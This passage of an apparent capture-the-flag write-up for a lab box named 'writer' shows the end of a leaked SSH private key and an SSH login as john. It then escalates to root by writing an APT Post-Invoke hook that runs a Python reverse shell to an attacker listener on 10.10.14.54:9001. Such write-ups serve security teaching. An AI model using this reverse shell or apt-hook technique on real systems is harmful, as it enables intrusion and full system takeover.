+2+itVvkgbayuG7JKnqA4IQTrgoJuC/s4ZT4M8qh4SuN/ANHGohCuNsOcb5xp/E2WmZ3Gcm
+bB0XE4BEhilAWLts4yexGrQ9So+eAXnfWZHRObhugy88TGy4v05B3z955EWDFnrJX0aMXn
+l6N71m/g5XoYJ6hu5tazJtaHrZQsD5f71DCTLTSe1ZMwea6MnPisV8O7PC/PFIBP+5mdPf
+3RXx0i7i5rLGdlTGJZUa+i/vGObbURyd5EECiS/Lpi0dnmUJKcgEKpf37xQgrFpTExAAAA
+wQDY6oeUVizwq7qNRqjtE8Cx2PvMDMYmCp4ub8UgG0JVsOVWenyikyYLaOqWr4gUxIXtCt
+A4BOWMkRaBBn+3YeqxRmOUo2iU4O3GQym3KnZsvqO8MoYeWtWuL+tnJNgDNQInzGZ4/SFK
+23cynzsQBgb1V8u63gRX/IyYCWxZOHYpQb+yqPQUyGcdBjpkU3JQbb2Rrb5rXWzUCzjQJm
+Zs9F7wWV5O3OcDBcSQRCSrES3VxY+FUuODhPrrmAtgFKdkZGYAAADBAPSpB9WrW9cg0gta
+9CFhgTt/IW75KE7eXIkVV/NH9lI4At6X4dQTSUXBFhqhzZcHq4aXzGEq4ALvUPP9yP7p7S
+2BdgeQ7loiRBng6WrRlXazS++5NjI3rWL5cmHJ1H8VN6Z23+ee0O8x62IoYKdWqKWSCEGu
+dvMK1rPd3Mgj5x1lrM7nXTEuMbJEAoX8+AAxQ6KcEABWZ1xmZeA4MLeQTBMeoB+1HYYm+1
+3NK8iNqGBR7bjv2XmVY6tDJaMJ+iJGdQAAAMEAz9h/44kuux7/DiyeWV/+MXy5vK2sJPmH
+Q87F9dTHwIzXQyx7xEZN7YHdBr7PHf7PYd4zNqW3GWL3reMjAtMYdir7hd1G6PjmtcJBA7
+Vikbn3mEwRCjFa5XcRP9VX8nhwVoRGuf8QmD0beSm8WUb8wKBVkmNoPZNGNJb0xvSmFEJ/
+BwT0yAhKXBsBk18mx8roPS+wd9MTZ7XAUX6F2mZ9T12aIYQCajbzpd+fJ/N64NhIxRh54f
+Nwy7uLkQ0cIY6XAAAAC2pvaG5Ad3JpdGVyAQIDBAUGBw==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+
+<p><img src="assets/writer_screenshots/john_private_key.png" alt="john_private_key" /></p>
+
+<p>Paste the private key into a file on our attacker box</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim john.id_rsa
+</code></pre></div></div>
+
+<p>And set the file to be readble only by us, as ssh likes it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>600 john.id_rsa
+</code></pre></div></div>
+
+<p>Then login to ssh as john using his private key.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> john.id_rsa john@10.129.212.12
+</code></pre></div></div>
+
+<p><img src="assets/writer_screenshots/john_ssh.png" alt="john_ssh" /></p>
+
+<p>John is in the management group, lets see what he can do.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>john<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>john<span class="o">)</span>,1003<span class="o">(</span>management<span class="o">)</span>
+john@writer:~<span class="nv">$ </span>find / <span class="nt">-group</span> 1003 <span class="nt">-ls</span> 2&gt;/dev/null
+    17525      4 drwxrwxr-x   2 root     management     4096 Jul 28 09:24 /etc/apt/apt.conf.d
+</code></pre></div></div>
+
+<p>John can write to the apt config directory.</p>
+
+<p>We can’t find a cron running in the crontab, lets look at the running processes with ps.
+We can see that apt-get update is periodicaly running.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>watch <span class="nt">-n</span> 1 <span class="s2">"ps aux | grep 'apt'"</span>
+</code></pre></div></div>
+
+<p><img src="assets/writer_screenshots/ps_grep_apt.png" alt="ps_grep_apt" /></p>
+
+<p>We should be able to exploit this by creating a script in the apt config directoy, then when apt-get update is run it should execute our script.</p>
+
+<p><a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">apt_privesc</a></p>
+
+<p>Lets create a python reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim /dev/shm/rev.py
+</code></pre></div></div>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">os</span><span class="p">,</span><span class="n">pty</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"10.10.14.54"</span><span class="p">,</span><span class="mi">9001</span><span class="p">))</span>
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Start another netcat listener on our attacker</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 9001
+</code></pre></div></div>
+
+<p>Create the apt config file on a loop so it gets picked up by apt-get update.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s1">'APT::Update::Post-Invoke {"python3 /dev/shm/rev.py";};'</span> <span class="o">&gt;</span> /etc/apt/apt.conf.d/02-pwn<span class="p">;</span> <span class="nb">sleep </span>1<span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+
+<p>Wait for the update to start and catch a root reverse shell.</p>
+
+<p><img src="assets/writer_screenshots/root_rev_shell.png" alt="root_rev_shell" /></p>
+:ET
